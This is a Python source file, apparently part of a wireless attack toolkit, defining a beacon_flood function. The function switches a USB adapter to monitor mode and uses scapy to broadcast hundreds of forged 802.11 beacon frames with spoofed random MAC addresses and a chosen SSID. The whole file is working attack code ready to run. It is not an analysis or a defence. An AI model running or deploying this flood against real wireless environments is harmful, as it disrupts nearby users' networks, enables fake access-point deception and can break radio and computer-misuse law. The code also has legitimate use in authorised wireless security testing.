#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import random
import scapy.all as scapy
from utils.hardware import interface, hardware_available, adapter_detected
from utils.interface import enable_monitor_mode, set_channel
from utils.status import print_status, ProgressDisplay
from utils.process import active_processes, add_process, remove_process, is_cancelled, set_cancel_flag


def beacon_flood(ssid: str, channel: str = "1", count: int = 500) -> bool:
    """Flood with fake beacon frames."""
    if not hardware_available or not adapter_detected:
        print_status("No USB adapter detected", "error")
        return False

    print_status(f"Beacon flood: {ssid}", "info")
    mon_iface = enable_monitor_mode(interface)
    if not mon_iface:
        print_status("Monitor mode failed", "error")
        return False

    if not set_channel(channel):
        return False

    set_cancel_flag(False)
    broadcast = "ff:ff:ff:ff:ff:ff"

    progress = ProgressDisplay()
    progress.start("Starting beacon flood", count)

    for i in range(count):
        if is_cancelled():
            progress.stop()
            print_status("Beacon flood cancelled", "warning")
            return False

        fake_mac = f"aa:bb:cc:{random.randint(0,255):02x}:{random.randint(0,255):02x}:{random.randint(0,255):02x}"
        beacon = scapy.RadioTap() / scapy.Dot11(
            type=0, subtype=8,
            addr1=broadcast,
            addr2=fake_mac,
            addr3=fake_mac
        ) / scapy.Dot11Beacon() / scapy.Dot11Elt(ID="SSID", info=ssid)
        scapy.sendp(beacon, iface=mon_iface, count=1, inter=0.01)
        progress.update(i + 1)

    progress.stop()
    print_status(f"Beacon flood complete: {count} frames", "success")
    return True
